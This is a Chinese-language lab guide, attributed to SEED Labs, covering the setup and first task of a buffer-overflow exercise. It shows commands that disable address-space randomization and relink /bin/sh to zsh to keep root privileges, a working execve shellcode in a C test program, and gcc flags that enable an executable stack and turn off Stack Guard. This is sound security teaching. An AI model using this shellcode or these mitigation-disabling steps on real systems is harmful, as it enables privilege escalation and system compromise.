# 缓冲区溢出实验详细说明

> 内容来源：SEED Labs

## 初始化安装

缓冲区溢出攻击是危害最大的攻击方式之一。为了防止缓冲区溢出攻击，已经研究出了多种保护机制，比较常用的有：
- 地址空间随机化
- 禁止栈执行
- Stack Guard

为了演示缓冲区溢出攻击的原理，我们将禁用这些机制。

1. 禁止地址空间随机化
本次实验在 ubuntu虚拟机下运行。需要禁止一些安全机制。在初始安装阶段，我们先执行下列语句：

```
# 禁止地址空间随机化机制 

[08/06/19]seed@VM:~$ sudo sysctl -w kernel.randomize_va_space=0
[sudo] password for seed: 
kernel.randomize_va_space = 0
```
注：sysctl命令用于运行时配置内核参数，这些参数位于/proc/sys目录下。sysctl配置与显示在/proc/sys目录中的内核参数．可以用sysctl来设置或重新设置联网功能，如IP转发、IP碎片去除以及源路由检查等。用户只需要编辑/etc/sysctl.conf文件，即可手工或自动执行由sysctl控制的功能。

2. 改变shell

此外，为了进一步防范缓冲区溢出攻击及其它利用shell程序的攻击，许多shell程序在被调用时自动放弃它们的特权。因此，即使你能欺骗一个Set-UID程序调用一个shell，也不能在这个shell中保持root权限，这个防护措施在/bin/bash中实现。

linux系统中，/bin/sh实际是指向/bin/bash或/bin/dash的一个符号链接。为了重现这一防护措施被实现之前的情形，我们使用另一个shell程序（zsh）代替/bin/bash。下面的指令描述了如何设置zsh程序：
```
sudo su
cd /bin
rm sh
ln -s zsh sh
```

## 任务1：运行Shellcode

任务1的任务是运行一个程序测试一个shellcode，它将注入到某个脆弱程序的堆栈中。

首先我们了解一下将要编译的shellcode源程序。用于打开一个shell的代码被转化为二进制机器码，粗放在code字符串中。
```
/*
A program that creates a file containing code for launching shell
*/

#include <stdlib.h>
#include <stdio.h>
#include <string.h>

const char code[] =
  "\x31\xc0"    /* xorl %eax, %eax    */
  "\x50"        /* pushl %eax         */
  "\x68""//sh"  /* pushl $0x68732f2f  */
  "\x68""/bin"  /* pushl $0x6e69622f  */
  "\x89\xe3"    /* movl %esp,%ebx     */
  "\x50"        /* pushl %eax         */
  "\x53"        /* pushl %ebx         */
  "\x89\xe1"    /* movl %esp, %ecx    */
  "\x99"        /* cdq                */
  "\xb0\x0b"    /* movb $0x0b, %al    */
  "\xcd\x80"    /* int $0x80          */
;

int main(int argc, char **argv){
  char buf[sizeof(code)];
  strcpy(buf,code);
  ((void(*)())buf)();
}
```

上面的C程序中包含了一段shellcode，存放在字符数组中。这个数组将被拷贝到缓冲区中。


- 允许或禁止栈执行 
```
#在编译c程序代码时设置 
#允许：
gcc -z execstack -o test test.c 
#禁止：
gcc -z noexecstack -o test test.c 
```
- 关闭gcc的Stack Guard 
```
gcc -fno-stack-protector -o test test.c
```